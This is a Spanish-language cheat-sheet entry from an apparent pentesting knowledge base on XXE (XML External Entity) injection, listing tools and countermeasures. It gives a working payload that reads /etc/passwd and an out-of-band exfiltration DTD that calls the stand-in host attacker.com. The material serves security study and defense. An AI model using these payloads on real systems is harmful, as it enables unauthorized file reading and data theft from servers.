---
title: Análisis de XXE (XML External Entity)
slug: analisis-xxe
aliases: [Análisis de XXE (XML External Entity)]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: []
learning_refs: []
---

# Análisis de XXE (XML External Entity)

## Descripción
La inyección de entidades externas XML (XXE) ocurre cuando una aplicación procesa documentos XML que contienen referencias a entidades externas no validadas. Un atacante puede explotar un analizador XML débilmente configurado para leer archivos locales del servidor, realizar escaneos de puertos internos o incluso ejecutar ataques SSRF.

## Herramientas
- **Burp Suite** (Repeater) — para manipular estructuras XML y probar la resolución de entidades.
- **XXEInjector** — herramienta automatizada para explotar vulnerabilidades XXE y extraer datos.

## Comandos / Ejemplos

### Lectura de archivos locales (LFI)
```xml
<!-- DTD malicioso inyectado en la petición -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>admin</password>
</user>
# Resultado: El servidor devuelve el contenido de /etc/passwd en la respuesta.
```

### Exfiltración OOB (Out-of-Band)
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
# El archivo evil.dtd en el servidor del atacante enviará los datos capturados por DNS o HTTP.
```

## Contramedidas
- Deshabilitar el procesamiento de entidades externas y DTDs en todos los analizadores XML.
- Usar formatos de datos menos complejos como JSON siempre que sea posible.
- Validar y sanitizar las entradas XML utilizando esquemas XSD estrictos.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
